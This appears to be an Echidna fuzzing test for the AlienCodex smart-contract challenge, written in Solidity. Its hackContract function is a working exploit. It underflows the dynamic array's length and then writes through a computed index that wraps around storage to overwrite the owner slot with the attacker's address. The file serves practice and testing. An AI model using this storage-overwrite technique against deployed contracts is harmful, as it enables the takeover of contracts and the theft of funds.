// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.5.0;

import "../src/AlienCodex.sol";

/// @dev Run the template with
///      ```
///      solc-select use 0.5.0
///      echidna ./test/AlienCodexTest.sol --contract AlienCodexTest
///      ```
contract AlienCodexTest is AlienCodex {
    address attackerAddress;

    constructor() public AlienCodex() {
        attackerAddress = tx.origin;
        transferOwnership(address(0x4000));
    }

    function hackContract() public {
        uint codexLengthSlot = 1;
        bytes32 hashOfSlot = keccak256(abi.encodePacked(codexLengthSlot));
        uint slotNum = uint(hashOfSlot);

        uint max256 = 0;
        max256--;

        uint distanceToOverflow = max256 - slotNum;
        uint neededForOverflow = distanceToOverflow + 1;

        bytes32 myAddress = bytes32(uint256(uint160(attackerAddress)));

        makeContact();
        retract();
        revise(neededForOverflow, myAddress);
    }

    function echidna_test_balance() public returns (bool) {
        return owner() != attackerAddress;
    }
}
